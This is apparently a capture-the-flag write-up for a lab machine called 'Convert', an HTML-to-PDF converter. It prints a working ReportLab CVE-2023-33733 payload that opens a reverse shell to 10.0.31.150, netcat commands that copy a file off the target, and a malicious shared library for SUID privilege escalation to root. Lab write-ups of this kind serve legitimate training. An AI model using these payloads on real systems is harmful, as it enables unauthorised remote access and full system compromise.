## Enumeration

`http://172.16.9.251`

An application called **Convert**, which has the functionality to convert **HTML** files into **PDF**.

![convert](/static/images/convert-writeup-images/image.png)

The application has a restriction, allowing only HTML files to be submitted. I tried bypassing the filter but was unsuccessful.

![convert 1](/static/images/convert-writeup-images/image1.png)

After submitting any HTML file, the application converts it to PDF.

After converting, we can use the **exiftool** tool to identify which tool/library was used for the conversion.

![convert 2](/static/images/convert-writeup-images/image2.png)

With the producer's name in hand, we can check if there is a related CVE.

![convert 3](/static/images/convert-writeup-images/image3.png)

To exploit **CVE-2023-33733**, we will send a malicious **.html** file, which will grant us RCE.

## Foot Hold

`evil.html`

```jsx
<para>
  <font color="[[[getattr(pow, Word('__globals__'))['os'].system('/bin/bash -c \'sh -i >& /dev/tcp/10.0.31.150/1337 0>&1\'') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
    exploit
  </font>
</para>
```

## Privillege Escalation

`find / -perm -u=s 2>/dev/null`

![convert 6](/static/images/convert-writeup-images/image6.png)

Upon accessing the **binary** directory and executing the **ucount** file, which has the SUID bit set, we notice that it returns the count of system users

![convert 7](/static/images/convert-writeup-images/image7.png)

Using the **strace** command, we can confirm that the file is using the **librunner.so** library, which is inside the functions directory.

![convert 8](/static/images/convert-writeup-images/image8.png)

With this, we can use a privilege escalation technique known as **Shared Library Hijacking**, creating our own **librunner.so** to be executed by the SUID **ucount**.

However, we do not have permission to modify **librunner.so** directly, but since the file is in our user's folder (flaskuser), we can alter it.

```python
mv binary/ binary2
mkdir -p binary/functions
```

![convert 9](/static/images/convert-writeup-images/image9.png)

Now, we will create our malicious library and place it inside the folder we just created.

To do this, let's transfer the original **librunner.so** to our machine for further analysis.

```python
#attacker machine
nc -lnvp 1234 > librunner.so
#target machine
nc 10.0.31.150 1234 < librunner.so
```

![convert 10](/static/images/convert-writeup-images/image10.png)

![convert 11](/static/images/convert-writeup-images/image11.png)

Opening the file in **Ghidra**, we see a function called **isRoot**, and we will use it to gain root access to the system.

Edit: Sorry, guys, the screenshot got cut off ðŸ˜„

![convert 12](/static/images/convert-writeup-images/image12.png)

```C
#include <stdlib.h>
#include <unistd.h>

void isRoot() {
	setuid(0);
	setgid(0);
	system("/bin/bash -i");
}

void lineCounter() {
}

```

`gcc -shared -fPIC -nostartfiles -o librunner.so librunner.c`

![convert 13](/static/images/convert-writeup-images/image13.png)

Now, just execute the SUID file located in the directory we created (binary2).
